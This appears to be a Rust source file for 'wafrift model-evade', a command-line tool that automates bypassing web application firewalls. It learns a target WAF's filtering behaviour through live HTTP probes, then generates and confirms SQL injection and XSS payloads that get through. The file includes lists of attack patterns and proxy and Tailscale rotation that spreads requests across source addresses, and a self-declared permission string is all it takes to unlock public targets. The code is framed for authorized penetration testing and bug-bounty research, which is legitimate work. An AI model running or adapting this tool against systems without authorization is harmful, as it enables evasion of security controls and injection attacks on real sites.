//! `wafrift model-evade`: active-learning WAF bypass via L* decompilation.
//!
//! This command implements the P1 attack paradigm:
//!
//! 1. **Learn**: Call `l_star_budgeted` over an HTTP oracle that sends
//!    live membership queries to the target WAF (each query = one HTTP
//!    request). Spend at most `--budget` membership queries.
//! 2. **Mine**: Intersect the learned symbolic automaton (the WAF's
//!    pass-language) with an attack grammar offline at ~1M candidates/s
//! (zero further live queries in this phase).
//! 3. **Verify**: For every mined candidate, send ONE live probe to
//!    confirm the learned model matches reality (model↔reality gap check).
//! 4. **Report**: Write verified bypasses as structured JSON.
//!
//! The key advantage over `wafrift scan` (mutation-first): the learner
//! reasons about the WAF's DECISION BOUNDARY, not just whether specific
//! mutations happen to pass. A bypass is deduced, not found by luck.
//!
//! # Example
//!
//! ```text
//! wafrift model-evade http://localhost:8080 --class sqli --budget 200
//! ```

use clap::Args;
use colored::Colorize;
use serde_json::json;
use std::path::PathBuf;
use std::process::ExitCode;
use std::sync::Arc;
use std::time::Instant;

use wafrift_transport::egress_pool::EgressPool;
use wafrift_types::Request;
use wafrift_wafmodel::{
    Alphabet, BoundedExhaustiveEq, FnOracle, LearnReport, Outcome, WafModelError, WafOracle,
    attack_grammar, l_star_budgeted, mine_bypasses,
};

use crate::equiv_engine::verified_bypass;

/// Map the user-facing `--class` names (`sqli`, `xss`, `all`) to the
/// canonical attack-class keys consumed by `equiv_engine::verified_bypass`.
/// `all` has no single oracle class; per-candidate verification is disabled
/// rather than silently guessing.
fn oracle_class_for_model_class(model_class: &str) -> Option<&'static str> {
    match model_class {
        "sqli" => Some("sql"),
        "xss" => Some("xss"),
        "all" => None,
        _ => None,
    }
}

/// Testable gate for a single mined candidate: the WAF must pass it AND the
/// per-class oracle must confirm the payload is still structurally valid.
fn candidate_is_verified_bypass(
    outcome: &Result<Outcome, WafModelError>,
    model_class: &str,
    payload: &str,
) -> bool {
    matches!(outcome, Ok(Outcome::Pass))
        && oracle_class_for_model_class(model_class)
            .is_some_and(|class| verified_bypass(class, payload, payload, false, 200))
}

/// Arguments for `wafrift model-evade`.
#[derive(Args, Debug)]
pub(crate) struct ModelEvadeArgs {
    /// Target URL (the WAF-protected endpoint to decompile and bypass).
    /// Membership queries are sent as GET requests with the candidate
    /// payload in the `--param` query parameter.
    /// Local / RFC1918 targets (localhost, 127.x.x.x, 10.x, 192.168.x)
    /// are always permitted. Public targets require `--i-have-permission`.
    #[arg(value_name = "TARGET_URL")]
    pub target_url: String,

    /// Attack class to decompile and mine bypasses for.
    /// `sqli`: SQL injection markers (UNION SELECT, OR 1=1, sleep(), etc.)
    /// `xss`: Cross-site scripting markers (<script, onerror=, onload=, etc.)
    /// `all`: Both classes combined.
    #[arg(long, default_value = "sqli", value_parser = ["sqli", "xss", "all"])]
    pub class: String,

    /// Per-phase cap on live membership queries (each query = one HTTP
    /// request to the target). It bounds BOTH the L* membership phase AND
    /// each equivalence round's query count, so the total live requests are
    /// roughly `budget × (1 + equivalence_rounds)`: typically 1–3 rounds,
    /// i.e. budget back-of-envelope ×2–4. Budget against a target's rate cap
    /// accordingly. Larger budgets produce more precise models; smaller
    /// budgets produce coarser approximations (still useful, the miner works
    /// with whatever boundary is learned). Budget-exhaustion is not an
    /// error: the command reports whatever bypasses the partial model
    /// yields and exits 0.
    #[arg(long, default_value_t = 500)]
    pub budget: u64,

    /// Maximum number of bypass candidates to mine from the learned
    /// model. Mining is offline (no HTTP); cap this for short runs.
    #[arg(long, default_value_t = 64)]
    pub max_mine: usize,

    /// Maximum byte length of mined bypass candidates. Shorter = faster
    /// mining; longer = richer candidates. The learner uses a small
    /// abstract alphabet so 24 bytes of abstract word can expand to a
    /// much longer concrete payload.
    #[arg(long, default_value_t = 24)]
    pub max_len: usize,

    /// Query parameter name to inject candidates into.
    /// Membership queries go to `<TARGET_URL>?<param>=<candidate>`.
    #[arg(long, default_value = "q")]
    pub param: String,

    /// I certify that I have permission to test this target (required
    /// for non-local targets not on the built-in allowlist).
    /// The value is logged so auditors can trace authorization back to
    /// the person who ran the tool, keep it short and specific:
    /// `"Bug bounty HackerOne #12345"`, `"Authorized pen test SOW 2026-05"`.
    #[arg(long, value_name = "REASON")]
    pub i_have_permission: Option<String>,

    /// Disable TLS certificate verification (useful for self-signed
    /// certs on internal test environments, do not use against
    /// production targets).
    #[arg(long, default_value_t = false)]
    pub insecure: bool,

    /// Write the JSON result to a file. Without this flag, JSON is
    /// printed to stdout so it can be piped to `jq`.
    #[arg(long, short)]
    pub output: Option<PathBuf>,

    /// Output format: `text` (default, colored summary) or `json`
    /// (machine-parseable, also implied by `--output`).
    #[arg(long, default_value = "text", value_parser = ["text", "json"])]
    pub format: String,

    // ─── Egress rotation ─────────────────────────────────────────────────────
    /// SOCKS5 proxy URL for egress rotation (repeatable).
    #[arg(long = "socks5", value_name = "URL", num_args = 0..)]
    pub egress_socks5: Vec<String>,

    /// HTTP proxy URL for egress rotation (repeatable).
    #[arg(long = "http-proxy", value_name = "URL", num_args = 0..)]
    pub egress_http_proxy: Vec<String>,

    /// Tailscale exit-node name for egress rotation (repeatable).
    #[arg(long = "tailscale-exit-node", value_name = "NODE", num_args = 0..)]
    pub egress_tailscale_nodes: Vec<String>,

    /// Tailscale SOCKS listener address. Default: `127.0.0.1:1055`.
    #[arg(long = "tailscale-socks-addr", value_name = "ADDR", default_value = crate::config::DEFAULT_TAILSCALE_SOCKS_ADDR)]
    pub egress_tailscale_socks_addr: String,

    /// Consecutive challenges before cooling an egress entry. Default: 3.
    #[arg(long = "egress-challenge-threshold", default_value_t = wafrift_types::DEFAULT_EGRESS_CHALLENGE_THRESHOLD)]
    pub egress_challenge_threshold: u32,

    /// Seconds a cooled egress entry stays out of rotation. Default: 300.
    #[arg(long = "egress-cooldown-secs", default_value_t = wafrift_types::DEFAULT_EGRESS_COOLDOWN_SECS)]
    pub egress_cooldown_secs: u64,
}

// ── Attack-class configuration ─────────────────────────────────────────────

/// Return the abstract alphabet + attack-grammar needles for a class.
///
/// The alphabet covers every byte a WAF rule in this class branches on;
/// the catch-all (`b'A'`) stands for every byte not otherwise listed.
/// The needles are the minimal substrings any block-triggering pattern
/// must contain (the attack grammar is their union).
pub(crate) fn class_config(class: &str) -> (Alphabet, Vec<&'static [u8]>) {
    match class {
        "sqli" => (
            // Distinguished bytes that SQL-injection WAF rules branch on.
            // INVARIANT (same as XSS above): every byte that appears in ANY
            // needle below MUST be in this set. kmp_sfa() uses the catch-all
            // representative (b'A') for unlisted bytes, so a needle byte not
            // here maps to the catch-all class and the KMP state machine can
            // never advance past it (the needle becomes silently unmatchable).
            //
            // Pre-fix: only UPPERCASE u/n/i/o/s/e/l/t/r/c were listed (left
            // over from a draft that used uppercase needles), but ALL needles
            // are lowercase. Every character in "union select", "or 1=1",
            // "sleep(", "; select" mapped to catch-all, zero bypasses were
            // ever mined from the sqli class.
            Alphabet::new(
                vec![
                    // Punctuation / operators that WAF rules branch on.
                    b'\'', b'"', b' ', b'-', b'/', b'*', b'=', b'(', b')', b';',
                    // Digits used in payloads (`1=1`, `0`).
                    b'0', b'1',
                    // Lowercase letters used in sqli needles:
                    //   union select → u, n, i, o, s, e, l, c, t
                    //   or / or 1=1  → o, r
                    //   sleep(       → s, l, e, p
                    //   ; select     → s, e, l, c, t
                    b'u', b'n', b'i', b'o', b's', b'e', b'l', b't', b'r', b'c', b'p',
                ],
                b'A',
            ),
            vec![
                b"union select" as &[u8],
                b"' or '",
                b"1=1",
                b"or 1=1",
                b"sleep(",
                b"; select",
            ],
        ),
        "xss" => (
            // Distinguished bytes that XSS WAF rules branch on.
            // INVARIANT: every byte that appears in ANY needle below MUST
            // be in this set. kmp_sfa() uses alpha.byte_of(catch_all_idx)
            // (= b'A') as the representative for all non-distinguished
            // bytes, so a needle byte not in the distinguished set maps
            // to the catch-all class, and kmp_next(state, b'A') will
            // never advance the KMP state machine past that needle byte,
            // making the needle silently unmatchable over the abstract alphabet.
            // Missing before: v, g, m, d (needed by <svg, <img, onload=).
            Alphabet::new(
                vec![
                    b'<', b'>', b'/', b'"', b'\'', b' ', b'=', b'(', b')', b's', b'c', b'r', b'i',
                    b'p', b't', b'o', b'n', b'l', b'a', b'e', b'v', b'g', b'm', b'd',
                ],
                b'A',
            ),
            vec![
                b"<script" as &[u8],
                b"onerror=",
                b"onload=",
                b"<svg",
                b"<img",
                b"alert(",
            ],
        ),
        _ => {
            // "all" (union of both sqli and xss).
            let (sqli_alpha, mut sqli_needles) = class_config("sqli");
            let (xss_alpha, xss_needles) = class_config("xss");
            sqli_needles.extend(xss_needles);
            // Merge alphabets: combine distinguished bytes from both classes.
            let mut combined: Vec<u8> = sqli_alpha.raw_symbols()[..sqli_alpha.catch_all()].to_vec();
            for &b in &xss_alpha.raw_symbols()[..xss_alpha.catch_all()] {
                if !combined.contains(&b) {
                    combined.push(b);
                }
            }
            (Alphabet::new(combined, b'A'), sqli_needles)
        }
    }
}

// ── HTTP oracle ────────────────────────────────────────────────────────────

/// Build a WAF oracle backed by async reqwest, run via the provided tokio
/// runtime handle.
///
/// The oracle sends `GET <target>?<param>=<payload>` for each membership query
/// and classifies the response with [`wafrift_liveoracle::verdict`]: a 2xx without a
/// block-page signature is `Pass`; a block status OR a 2xx block page is
/// `Block`; a rate-limit / gateway transient (`429`/`502`/`503`/`504`) is
/// retried with backoff and, if persistent, surfaced as an inconclusive error
/// rather than a false `Block`.
///
/// The oracle is `FnOracle<impl FnMut(...) -> Result<Outcome>>`: it
/// implements `WafOracle` exactly as the trait requires.
///
/// When `egress_pool` is `Some`, the next available egress entry for the
/// target host is applied to the reqwest client, identical to the pattern
/// used by `bench-waf` (R52 pass-14 I1). Pre-fix, the pool was parsed and
/// stored in `ModelEvadeArgs` but never applied here, so every
/// `--socks5 / --http-proxy / --tailscale-exit-node` flag was silently
/// discarded and all oracle queries routed direct.
pub(crate) fn build_http_oracle(
    rt: Arc<tokio::runtime::Runtime>,
    target_url: String,
    param: String,
    insecure: bool,
    egress_pool: Option<Arc<EgressPool>>,
    block_signatures: Option<Vec<String>>,
) -> Result<impl WafOracle, String> {
    // Resolve the host for egress selection before consuming target_url.
    let target_host = reqwest::Url::parse(&target_url)
        .ok()
        .and_then(|u| u.host_str().map(str::to_owned))
        .unwrap_or_default();

    // Use the canonical transport builder so insecure / timeout / UA are
    // consistent with every other wafrift HTTP client.
    let mut client_builder = wafrift_transport::base_client_builder(
        10, // 10 s oracle timeout, reasonable for membership queries
        insecure,
        Some("wafrift/model-evade (authorized security research)"),
    )
    .redirect(reqwest::redirect::Policy::none());

    // Apply egress entry when a pool is supplied (--socks5 / --http-proxy /
    // --tailscale-exit-node). On pool-cooled error we fall back to direct to
    // avoid killing the entire L* session on a transient egress hiccup.
    if let Some(ref pool) = egress_pool {
        match pool.next_for(&target_host) {
            Ok(entry) => client_builder = entry.apply_to_builder(client_builder),
            Err(e) => {
                eprintln!(
                    "{} egress pool error for model-evade oracle (routing direct): {e}",
                    "warn:".yellow()
                );
            }
        }
    }

    let client = client_builder
        .build()
        .map_err(|e| format!("failed to build HTTP client: {e}"))?;

    let client = Arc::new(client);
    let target_url = Arc::new(target_url);
    let param = Arc::new(param);
    // Tier-B block-page signatures, loaded once: a 2xx body carrying one of
    // these is a block served with a success status (not a pass). A
    // `--block-signatures` file overrides the embedded default.
    let block_signatures = Arc::new(
        block_signatures.unwrap_or_else(wafrift_liveoracle::verdict::default_block_signatures),
    );

    // Self-calibration: learn THIS target's block signal from controls so the
    // oracle works even against a WAF whose block shape no signature lists. If
    // the target does not distinguish a benign control from the malicious ones,
    // calibration declines (None) and we fall back to the static classifier.
    let calibration = Arc::new(calibrate_target(&rt, &client, &target_url, &param));
    if let Some(c) = calibration.as_ref() {
        eprintln!(
            "{} oracle self-calibration: {}",
            "info:".cyan(),
            c.describe()
        );
    }

    Ok(FnOracle::new(move |req: &Request| {
        // Extract payload bytes from the wafrift Request body (the learner
        // passes abstract-alphabet bytes concretized into a byte vector).
        let payload_bytes = req.body_bytes().unwrap_or(&[]).to_vec();
        let payload = String::from_utf8_lossy(&payload_bytes).into_owned();

        // Build probe URL: target?param=url-encoded-payload
        let probe_url = format!(
            "{}?{}={}",
            target_url.as_str(),
            param.as_str(),
            urlencoding::encode(&payload)
        );

        // Each membership query is one live probe; the retry loop may re-send.
        let probe = || send_live_probe(&rt, &client, &probe_url, false);

        // Compose the verdict: a rate-limit / gateway transient first (a
        // deferral, never a block), then the LEARNED per-target discriminator,
        // then the static signature/status classifier as the always-available
        // fallback, so an unknown WAF is handled by calibration and a known
        // one by signatures, with neither able to fabricate a verdict.
        let classify = |r: &wafrift_liveoracle::verdict::ProbeResponse| {
            use wafrift_liveoracle::verdict::LiveVerdict;
            if matches!(r.status, 429 | 502 | 503 | 504) {
                return LiveVerdict::Transient;
            }
            if let Some(cal) = calibration.as_ref()
                && let Some(v) = cal.classify(r.status, &r.body)
            {
                return v;
            }
            wafrift_liveoracle::verdict::classify_live_response(
                r.status,
                &r.body,
                &block_signatures,
            )
        };

        wafrift_liveoracle::verdict::classify_with_retry(
            probe,
            classify,
            wafrift_liveoracle::verdict::MAX_TRANSIENT_RETRIES,
            std::thread::sleep,
        )
    }))
}

/// Send one live probe and capture status, `Retry-After`, and a bounded body.
/// The body is read for any 2xx (block-page detection) and, when
/// `read_body_all_statuses` is set (calibration), for every status so block and
/// allow baselines can be compared by content.
fn send_live_probe(
    rt: &Arc<tokio::runtime::Runtime>,
    client: &Arc<reqwest::Client>,
    probe_url: &str,
    read_body_all_statuses: bool,
) -> std::result::Result<wafrift_liveoracle::verdict::ProbeResponse, WafModelError> {
    let client = client.clone();
    let probe_url = probe_url.to_string();
    rt.block_on(async move {
        let resp =
            client.get(&probe_url).send().await.map_err(|e| {
                WafModelError::Oracle(format!("HTTP error probing {probe_url}: {e}"))
            })?;
        let status = resp.status().as_u16();
        let retry_after_secs = resp
            .headers()
            .get(reqwest::header::RETRY_AFTER)
            .and_then(|v| v.to_str().ok())
            .and_then(|s| s.trim().parse::<u64>().ok());
        let body = if read_body_all_statuses || (200..300).contains(&status) {
            crate::safe_body::read_bounded(resp, wafrift_liveoracle::verdict::BLOCK_SCAN_BYTES)
                .await
                .map_err(|e| WafModelError::Oracle(format!("reading response body: {e}")))?
        } else {
            Vec::new()
        };
        Ok(wafrift_liveoracle::verdict::ProbeResponse {
            status,
            retry_after_secs,
            body,
        })
    })
}

/// Run the calibration phase: probe a benign control and the malicious controls,
/// then derive a per-target discriminator. `None` when the target cannot be
/// calibrated (no WAF, or it blocks even the benign control), the caller then
/// relies on the static classifier.
fn calibrate_target(
    rt: &Arc<tokio::runtime::Runtime>,
    client: &Arc<reqwest::Client>,
    target_url: &Arc<String>,
    param: &Arc<String>,
) -> Option<wafrift_liveoracle::calibration::Calibration> {
    let probe = |value: &str| -> Option<wafrift_liveoracle::calibration::Baseline> {
        let url = format!(
            "{}?{}={}",
            target_url.as_str(),
            param.as_str(),
            urlencoding::encode(value)
        );
        let r = send_live_probe(rt, client, &url, true).ok()?;
        Some(wafrift_liveoracle::calibration::Baseline {
            status: r.status,
            body: r.body,
            control: value.as_bytes().to_vec(),
        })
    };
    let benign = probe(wafrift_liveoracle::calibration::benign_control())?;
    let malicious: Vec<_> = wafrift_liveoracle::calibration::malicious_controls()
        .iter()
        .filter_map(|m| probe(m))
        .collect();
    if malicious.is_empty() {
        return None;
    }
    wafrift_liveoracle::calibration::calibrate(benign, malicious)
}

// ── Permission gate ────────────────────────────────────────────────────────

/// Check that the operator has declared permission to test the target.
/// Localhost / RFC1918 targets are always permitted (local bench stacks).
pub(crate) fn check_permission(url: &str, explicit_reason: &Option<String>) -> Result<(), String> {
    use std::net::IpAddr;

    // Parse hostname from URL (strip scheme, then take the host:port part).
    let host = url
        .trim_start_matches("http://")
        .trim_start_matches("https://")
        .split(['/', '?', '#'])
        .next()
        .unwrap_or(url)
        // Strip port.
        .split(':')
        .next()
        .unwrap_or(url);

    // Always allow localhost / loopback aliases.
    let loopback_hosts = ["localhost", "127.0.0.1", "::1", "0.0.0.0"];
    if loopback_hosts.contains(&host) {
        return Ok(());
    }

    // Allow RFC1918 IP ranges.
    if let Ok(ip) = host.parse::<IpAddr>() {
        let is_private = match ip {
            IpAddr::V4(v4) => {
                let o = v4.octets();
                // 10.0.0.0/8
                o[0] == 10
                // 172.16.0.0/12
                || (o[0] == 172 && (16..=31).contains(&o[1]))
                // 192.168.0.0/16
                || (o[0] == 192 && o[1] == 168)
                // Loopback 127.0.0.0/8
                || o[0] == 127
            }
            IpAddr::V6(v6) => v6.is_loopback(),
        };
        if is_private {
            return Ok(());
        }
    }

    // Built-in allowlist (public bounty programs and lab targets).
    let allowlist = [
        "waf.cumulusfire.net",
        "testing.santh.dev",
        "ginandjuice.shop",
    ];
    for suffix in allowlist {
        if host == suffix || host.ends_with(&format!(".{suffix}")) {
            return Ok(());
        }
    }

    // Require explicit permission for everything else.
    match explicit_reason {
        Some(reason) if !reason.trim().is_empty() => {
            eprintln!(
                "{} Permission declared: {reason}",
                "model-evade:".bold().cyan()
            );
            Ok(())
        }
        _ => Err(format!(
            "Target `{url}` is not on the built-in allowlist. \
             Declare authorization with `--i-have-permission \"<reason>\"` \
             (e.g. \"Bug bounty HackerOne #12345\" or \"Authorized pen test SOW 2026-05\"). \
             Local targets (localhost, 127.x, 10.x, 192.168.x) are always permitted."
        )),
    }
}

// ── JSON output schema ─────────────────────────────────────────────────────

/// One candidate entry in the output JSON (verified or not).
#[derive(serde::Serialize, Debug)]
pub(crate) struct BypassEntry {
    pub payload: String,
    pub payload_hex: String,
    pub verified: bool,
    pub class: String,
}

impl BypassEntry {
    pub(crate) fn new(bytes: Vec<u8>, class: &str, verified: bool) -> Self {
        let payload = String::from_utf8_lossy(&bytes).into_owned();
        let payload_hex = hex::encode(&bytes);
        BypassEntry {
            payload,
            payload_hex,
            verified,
            class: class.to_string(),
        }
    }
}

// ── Accept-all SFA (fallback for budget-exhausted learning) ───────────────

/// An SFA that accepts every input string, used as the fallback model
/// when the L* budget is exhausted before the hypothesis stabilised.
/// Mining against an accept-all model proposes all attack-grammar strings
/// as bypass candidates; online verification then filters them honestly.
fn accept_all_sfa() -> wafrift_wafmodel::Sfa {
    use wafrift_wafmodel::{BytePred, Sfa};
    Sfa::new(0, vec![true], vec![vec![(BytePred::any(), 0)]])
}

// ── Main entry point ───────────────────────────────────────────────────────

/// Run `wafrift model-evade`.
pub(crate) fn run_model_evade(mut args: ModelEvadeArgs) -> ExitCode {
    args.target_url = crate::helpers::normalize_target_url(&args.target_url);
    // ── Step 0: permission gate ──────────────────────────────────────
    if let Err(msg) = check_permission(&args.target_url, &args.i_have_permission) {
        eprintln!("{} {msg}", "Permission error:".red().bold());
        return ExitCode::from(2);
    }

    // ── Step 0b: tokio runtime ───────────────────────────────────────
    let rt = match tokio::runtime::Runtime::new() {
        Ok(r) => Arc::new(r),
        Err(e) => {
            eprintln!("error: failed to start tokio runtime: {e}");
            return ExitCode::from(1);
        }
    };

    let json_mode = args.format == "json" || args.output.is_some();

    if !json_mode {
        println!("{}", "wafrift model-evade".bold().cyan());
        println!("{} {}", "Target:".bold().cyan(), args.target_url);
        println!("{} {}", "Class: ".bold().cyan(), args.class);
        println!(
            "{} {} queries / {} candidates / max {} bytes",
            "Budget:".bold().cyan(),
            args.budget,
            args.max_mine,
            args.max_len
        );
        println!();
    }

    // ── Step 1: build alphabet + attack grammar ──────────────────────
    let (alpha, needles) = class_config(&args.class);

    // ── Step 1b: build egress pool (--socks5 / --http-proxy / --tailscale) ─
    // R52-style wiring (CLAUDE.md §9 WIRING): pre-fix these args were parsed,
    // stored, and silently discarded (every oracle query routed direct).
    let want_egress = !args.egress_socks5.is_empty()
        || !args.egress_http_proxy.is_empty()
        || !args.egress_tailscale_nodes.is_empty();
    let egress_pool: Option<Arc<EgressPool>> = if want_egress {
        let mut pool_builder = EgressPool::builder();
        if !args.egress_socks5.is_empty() {
            pool_builder = match pool_builder.socks5_str(args.egress_socks5.clone()) {
                Ok(b) => b,
                Err(e) => {
                    eprintln!("{} --socks5: {e}", "error:".red().bold());
                    return ExitCode::from(2);
                }
            };
        }
        if !args.egress_http_proxy.is_empty() {
            pool_builder = match pool_builder.http_proxy_str(args.egress_http_proxy.clone()) {
                Ok(b) => b,
                Err(e) => {
                    eprintln!("{} --http-proxy: {e}", "error:".red().bold());
                    return ExitCode::from(2);
                }
            };
        }
        if !args.egress_tailscale_nodes.is_empty() {
            let socks_addr = if args.egress_tailscale_socks_addr.is_empty() {
                None
            } else {
                Some(args.egress_tailscale_socks_addr.clone())
            };
            pool_builder =
                pool_builder.tailscale_nodes(args.egress_tailscale_nodes.clone(), socks_addr);
        }
        match pool_builder.build() {
            Ok(p) => Some(Arc::new(p)),
            Err(e) => {
                eprintln!("{} egress pool: {e}", "error:".red().bold());
                return ExitCode::from(2);
            }
        }
    } else {
        None
    };

    // ── Step 2: learn the WAF's decision boundary ────────────────────
    if !json_mode {
        println!(
            "{}",
            "Phase 1: Learning WAF decision boundary (L*)...".bold()
        );
        if egress_pool.is_some() {
            println!(
                "  {} egress rotation ON ({} SOCKS5 + {} HTTP proxy + {} Tailscale)",
                "note:".bold().cyan(),
                args.egress_socks5.len(),
                args.egress_http_proxy.len(),
                args.egress_tailscale_nodes.len(),
            );
        }
    }
    let t_learn_start = Instant::now();

    // Build the oracle FIRST (validates HTTP client construction).
    let mut oracle = match build_http_oracle(
        rt.clone(),
        args.target_url.clone(),
        args.param.clone(),
        args.insecure,
        egress_pool.clone(),
        None, // model-evade uses the embedded default block-page signatures
    ) {
        Ok(o) => o,
        Err(e) => {
            eprintln!("{} {e}", "Oracle error:".red().bold());
            return ExitCode::from(1);
        }
    };

    // Request builder: POST body is the injection channel.
    // The body channel is what most WAFs inspect as REQUEST_BODY.
    let target_url_for_build = args.target_url.clone();
    let build_req = move |bytes: &[u8]| -> Request {
        Request::post(
            format!(
                "{}/model-evade-probe",
                target_url_for_build.trim_end_matches('/')
            ),
            bytes.to_vec(),
        )
        .header("Content-Type", "application/x-www-form-urlencoded")
    };

    // max_queries caps the EQ oracle's HTTP round-trips per equivalence
    // round. With a 22-symbol sqli alphabet the BFS frontier reaches
    // 22⁵ ≈ 5 M entries at depth 5, capped to 1 M by FRONTIER_CAP
    // still 1 M HTTP calls per EQ round without this gate.
    //
    // §13 dogfood round-2 DEFECT 3: tie this cap to `--budget` instead of a
    // hardcoded 500. EQ-round queries are ALSO live requests to the target;
    // with the old fixed 500, `--budget 50` still fired ~500+ live requests
    // (≈10× the stated budget), risking a rate-limit ban on a bounty target.
    // Tracking the budget keeps total live spend scaling with the operator's
    // choice (default 500 → eq cap 500, unchanged). A smaller cap merely
    // yields a coarser model (the EQ search is documented best-effort, never
    // an error). Total live requests ≈ budget (membership) + budget × eq
    // rounds (the flag doc spells this out so rate-budgeting is honest).
    let mut eq = BoundedExhaustiveEq {
        max_len: 6,
        max_queries: Some(args.budget),
    };
    let learn_result: LearnReport =
        match l_star_budgeted(&mut oracle, &build_req, &alpha, &mut eq, args.budget) {
            Ok(r) => {
                if !json_mode {
                    println!(
                        "  {} {} membership queries, {} equivalence rounds, {:.1}s",
                        "Learned:".bold().green(),
                        r.membership_queries,
                        r.equivalence_rounds,
                        t_learn_start.elapsed().as_secs_f64()
                    );
                }
                r
            }
            Err(WafModelError::BudgetExhausted { queries }) => {
                if !json_mode {
                    println!(
                        "  {} budget of {} queries exhausted after {} queries. \
                         using optimistic accept-all model for mining.",
                        "Note:".bold().yellow(),
                        args.budget,
                        queries
                    );
                }
                // Fallback: accept-all SFA. Mining proposes all attack-grammar
                // strings; online verification gates every result honestly.
                LearnReport {
                    sfa: accept_all_sfa(),
                    membership_queries: queries,
                    equivalence_rounds: 0,
                }
            }
            Err(e) => {
                eprintln!("{} {e}", "Learning error:".red().bold());
                return ExitCode::from(1);
            }
        };

    let t_learn_elapsed = t_learn_start.elapsed();
    let learned_sfa = &learn_result.sfa;

    // ── Step 3: mine bypasses offline ────────────────────────────────
    if !json_mode {
        println!(
            "{}",
            "\nPhase 2: Mining bypass candidates (offline)...".bold()
        );
    }
    let t_mine_start = Instant::now();
    let grammar = attack_grammar(&alpha, &needles);
    let candidates = mine_bypasses(learned_sfa, &grammar, args.max_mine, args.max_len);
    let t_mine_elapsed = t_mine_start.elapsed();

    if !json_mode {
        println!(
            "  {} {} candidate(s) in {:.3}s",
            "Mined:".bold().green(),
            candidates.len(),
            t_mine_elapsed.as_secs_f64()
        );
    }

    if candidates.is_empty() {
        let note = "No bypass candidates found. The learned model has no intersection \
                    with the attack grammar, either the WAF blocks everything in \
                    this class, or the budget was too small to learn the boundary \
                    precisely. Try a larger --budget.";
        if json_mode {
            let report = json!({
                "schema_version": 1u32,
                "target": args.target_url,
                "class": args.class,
                "budget_used": learn_result.membership_queries,
                "equivalence_rounds": learn_result.equivalence_rounds,
                "learn_time_secs": t_learn_elapsed.as_secs_f64(),
                "mine_time_secs": t_mine_elapsed.as_secs_f64(),
                "verify_time_secs": 0.0,
                "total_queries": oracle.queries(),
                "candidates_mined": 0u32,
                "bypass_count": 0u32,
                "verified_rate_pct": 0.0,
                "bypasses": serde_json::Value::Array(Vec::new()),
                "all_candidates": serde_json::Value::Array(Vec::new()),
                "note": note,
            });
            emit_output(args.output.as_deref(), &report.to_string());
        } else {
            println!("\n{} {note}", "Note:".bold().yellow());
        }
        return ExitCode::SUCCESS;
    }

    // ── Step 4: verify candidates online ─────────────────────────────
    if !json_mode {
        println!(
            "{}",
            "\nPhase 3: Verifying candidates against the live target...".bold()
        );
    }
    let t_verify_start = Instant::now();
    let mut verified: Vec<BypassEntry> = Vec::new();

    for candidate in &candidates {
        let payload_str = String::from_utf8_lossy(candidate).into_owned();
        // Verify via GET to the target URL with the payload as query param.
        let probe_url = format!(
            "{}?{}={}",
            args.target_url.trim_end_matches('/'),
            args.param,
            urlencoding::encode(&payload_str)
        );
        let probe_req = Request::get(&probe_url);
        let outcome = oracle.classify(&probe_req);
        let is_bypass = candidate_is_verified_bypass(&outcome, &args.class, &payload_str);

        if is_bypass && !json_mode {
            println!(
                "  {} {}",
                "BYPASS:".bold().green(),
                payload_str.bright_white()
            );
        }
        verified.push(BypassEntry::new(candidate.clone(), &args.class, is_bypass));
    }

    let t_verify_elapsed = t_verify_start.elapsed();
    let bypass_count = verified.iter().filter(|e| e.verified).count();
    let total_queries = oracle.queries();
    let verified_rate_pct = if !candidates.is_empty() {
        (bypass_count as f64 / candidates.len() as f64) * 100.0
    } else {
        0.0
    };

    // ── Step 5: output ────────────────────────────────────────────────
    if json_mode {
        let bypass_objs: Vec<serde_json::Value> = verified
            .iter()
            .filter(|e| e.verified)
            .map(|e| {
                json!({
                    "payload": e.payload,
                    "payload_hex": e.payload_hex,
                    "class": e.class,
                    "verified": true,
                })
            })
            .collect();

        let all_objs: Vec<serde_json::Value> = verified
            .iter()
            .map(|e| {
                json!({
                    "payload": e.payload,
                    "payload_hex": e.payload_hex,
                    "class": e.class,
                    "verified": e.verified,
                })
            })
            .collect();

        let report = json!({
            "schema_version": 1u32,
            "target": args.target_url,
            "class": args.class,
            "budget_used": learn_result.membership_queries,
            "equivalence_rounds": learn_result.equivalence_rounds,
            "total_queries": total_queries,
            "candidates_mined": candidates.len(),
            "bypass_count": bypass_count,
            "verified_rate_pct": verified_rate_pct,
            "learn_time_secs": t_learn_elapsed.as_secs_f64(),
            "mine_time_secs": t_mine_elapsed.as_secs_f64(),
            "verify_time_secs": t_verify_elapsed.as_secs_f64(),
            "bypasses": bypass_objs,
            "all_candidates": all_objs,
        });

        emit_output(args.output.as_deref(), &report.to_string());
    } else {
        println!();
        println!("{}", "─── Summary ───".bold().bright_black());
        println!(
            "  {:<32} {}",
            "Total queries (learn + verify):".bold().cyan(),
            total_queries
        );
        println!(
            "  {:<32} {:.1}s",
            "Learn time:".bold().cyan(),
            t_learn_elapsed.as_secs_f64()
        );
        println!(
            "  {:<32} {:.4}s",
            "Mine time (offline):".bold().cyan(),
            t_mine_elapsed.as_secs_f64()
        );
        println!(
            "  {:<32} {:.1}s",
            "Verify time:".bold().cyan(),
            t_verify_elapsed.as_secs_f64()
        );
        println!(
            "  {:<32} {} / {} ({:.1}%)",
            "Bypasses (verified / mined):".bold().cyan(),
            bypass_count,
            candidates.len(),
            verified_rate_pct
        );

        if bypass_count == 0 {
            println!(
                "\n{} No verified bypasses found. The model predicted candidates \
                 but the live target blocked them, the model may need more budget. \
                 Try a larger --budget.",
                "Note:".bold().yellow()
            );
        }
    }

    ExitCode::SUCCESS
}

/// Emit the JSON output to a file or stdout.
fn emit_output(path: Option<&std::path::Path>, content: &str) {
    match path {
        Some(p) => {
            let to_write = format!("{content}\n");
            if let Err(e) = std::fs::write(p, &to_write) {
                eprintln!("error writing output to {}: {e}", p.display());
            } else {
                eprintln!("model-evade results written to {}", p.display());
            }
        }
        None => println!("{content}"),
    }
}

#[cfg(test)]
#[path = "model_evade_cmd_tests.rs"]
mod tests;
